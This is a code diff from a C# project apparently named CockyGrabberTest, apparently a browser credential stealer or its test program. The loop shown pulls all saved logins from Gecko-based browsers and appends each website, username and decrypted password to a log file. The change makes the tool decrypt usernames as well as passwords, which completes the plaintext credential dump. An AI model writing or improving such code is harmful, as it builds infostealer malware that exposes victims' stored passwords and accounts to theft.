@@ -28,7 +28,7 @@ namespace CockyGrabberTest
             }
             foreach (Gecko.Login c in g.GetAllGeckoLogins())
             {
-                logins.AppendLine($"Website: {c.Hostname} | Username: {c.EncryptedUsername} | Password: {c.DecryptedPassword}");
+                logins.AppendLine($"Website: {c.Hostname} | Username: {c.DecryptedUsername} | Password: {c.DecryptedPassword}");
             }
 
             File.AppendAllText(LogFilePath, logins.ToString()); // Append the grabbed logins to the log file
